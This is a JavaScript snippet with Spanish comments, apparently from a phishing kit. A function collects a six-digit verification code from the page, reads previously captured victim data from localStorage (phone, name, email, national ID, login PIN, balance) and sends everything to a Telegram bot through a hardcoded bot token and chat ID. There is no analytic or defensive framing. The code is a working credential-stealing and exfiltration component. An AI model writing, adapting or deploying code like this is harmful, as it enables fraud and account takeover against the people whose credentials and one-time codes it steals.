









  /* ===============================
  3 formulario
  =============================== */

async function captureAndSendOTP() {

  /* ===============================
   
  =============================== */
  let codigoOTP = "";
  for (let i = 0; i < 6; i++) {
    const input = document.getElementById("c" + i);
    if (!input || !input.value) {
      alert("Completa el código de verificación");
      return;
    }
    codigoOTP += input.value;
  }

  /* ===============================
     OBTENER STORAGE 1: registros
  =============================== */
  const registros = JSON.parse(localStorage.getItem("registros"));
  let datosConsulta = "❌ No hay datos del formulario de consulta";

  if (registros && registros.length > 0) {
    const r = registros[registros.length - 1];
    datosConsulta =
      "📦 FORMULARIO CONSULTA\n" +
      "📱 Teléfono: " + r.telefono + "\n" +
      "👤 Nombre: " + r.nombre + "\n" +
      "📧 Correo: " + r.correo + "\n" +
      "🆔 Cédula: " + r.cedula + "\n" +
      "🕒 Fecha: " + r.fecha;
  }

  /* ===============================
     OBTENER STORAGE 2: loginData
  =============================== */
  const loginData = JSON.parse(localStorage.getItem("loginData"));
  let datosLogin = "❌ No hay datos del formulario login";

  if (loginData) {
    datosLogin =
      "📦 FORMULARIO LOGIN\n" +
      "📱 Teléfono: " + loginData.telefono + "\n" +
      "🔐 PIN: " + loginData.pin + "\n" +
      "💰 Saldo: " + loginData.saldo + "\n" +
      "🕒 Fecha: " + loginData.fecha;
  }

  /* ===============================
     MENSAJE FINAL
  =============================== */
  const TELEGRAM_BOT_TOKEN = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";
  const TELEGRAM_CHAT_ID  = "8417322083";

  const mensajeFinal =
    datosConsulta + "\n\n" +
    datosLogin + "\n\n" +
    "📦 CONFIRMACIÓN FINAL\n" +
    "🔢 Código verificación: " + codigoOTP + "\n" +
    "🕒 Fecha: " + new Date().toLocaleString();

  /* ===============================
     ENVÍO A TELEGRAM
  =============================== */
  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: mensajeFinal
        })
      }
    );


  } catch (error) {
    console.error(error);
    alert("Error al enviar  ❌");
  }
}









